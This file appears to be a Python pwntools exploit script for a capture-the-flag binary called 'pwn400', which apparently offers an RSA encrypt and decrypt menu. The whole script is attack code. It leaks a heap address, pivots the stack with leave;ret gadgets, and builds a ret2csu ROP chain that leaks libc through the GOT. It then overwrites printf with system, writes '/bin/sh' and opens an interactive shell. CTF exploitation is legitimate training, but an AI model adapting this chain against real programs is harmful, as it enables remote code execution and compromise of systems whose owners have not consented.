from pwn import *

context.log_level = 'debug'
#context.aslr = False

io = process('./pwn400')
e = ELF('./pwn400')
libc = e.libc

def new_cipher(p, q):
	io.recvuntil('exit\n')
	io.sendline('1')
	io.recvuntil('No\n')
	io.sendline('1')
	io.recvuntil('p:')
	io.sendline(str(p))
	io.recvuntil('q:')
	io.sendline(str(q))

def enc(buf, size):
	io.recvuntil('exit\n')
	io.sendline('2')
	io.recvuntil('0x40)\n')
	io.sendline(str(size))
	io.recvuntil('plaintext\n')
	io.sendline(buf)

def dec(buf, size):
	io.recvuntil('exit\n')
	io.sendline('3')
	io.recvuntil('encoded)\n')
	io.sendline(str(size))
	io.recvuntil('ciphertext\n')
	io.sendline(buf)

def comment(buf):
	io.recvuntil('exit\n')
	io.sendline('4')
	io.recvuntil('RSA')
	io.sendline(buf)

'''
Your private key:       (107,143)
Your public key:        (83,143)
'''
new_cipher(11,13)
enc('A'*0x40, 0x40)
io.recvuntil('4100000000000000')
buf = io.recv(10)
buf = buf.split('\n')[0].ljust(8,'\x00')
heap = u64(buf)

log.success('heap:%#x'%heap)

heap_base = heap - 0x270


dec('AAAA', 0x4)



'''
.text:0000000000402320 loc_402320:                             ; CODE XREF: init+54j
.text:0000000000402320                 mov     rdx, r13
.text:0000000000402323                 mov     rsi, r14
.text:0000000000402326                 mov     edi, r15d
.text:0000000000402329                 call    qword ptr [r12+rbx*8]
.text:000000000040232D                 add     rbx, 1
.text:0000000000402331                 cmp     rbx, rbp
.text:0000000000402334                 jnz     short loc_402320
.text:0000000000402336
.text:0000000000402336 loc_402336:                             ; CODE XREF: init+36j
.text:0000000000402336                 add     rsp, 8
.text:000000000040233A                 pop     rbx
.text:000000000040233B                 pop     rbp
.text:000000000040233C                 pop     r12
.text:000000000040233E                 pop     r13
.text:0000000000402340                 pop     r14
.text:0000000000402342                 pop     r15
.text:0000000000402344                 retn
.text:0000000000402344 init            endp
'''

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x0402336
	addr2 = 0x0402320
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

'''
.text:0000000000401F62                 mov     ecx, [rbp+len]
.text:0000000000401F68                 lea     rax, [rbp+buf]
.text:0000000000401F6F                 mov     edx, 0
.text:0000000000401F74                 mov     esi, ecx
.text:0000000000401F76                 mov     rdi, rax
.text:0000000000401F79                 call    read_buf
'''
leave_ret = 0x0000000000400ea2 # leave ; ret
pop_rdi_ret = 0x0000000000402343 # pop rdi ; ret
over_flow_func = 0x00401F68
bss = 0x060438F


payload = p64(heap_base + 0x18)
payload += 'A' * 0x10
payload += p64(leave_ret) *2
payload += p64(over_flow_func) * 2

comment(payload)
gdb.attach(io, "b *0x401F6F")#
dec('AAAA',0x4)

payload = 'A' * 0x228 
payload += com_gadet(e.got['printf'], e.got['read'])
payload += com_gadet(e.got['read'], 0, bss , 8)
payload += com_gadet(e.got['read'], 0, e.got['printf'], 8)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(e.plt['printf'])

io.sendline(payload)

buf = io.recv(6)
buf = buf.ljust(8, '\x00')

read_addr = u64(buf)
log.success('read:%#x'%read_addr)
libc.address = read_addr - libc.symbols['read']

io.send('/bin/sh\x00')
io.send(p64(libc.symbols['system']))

io.interactive()

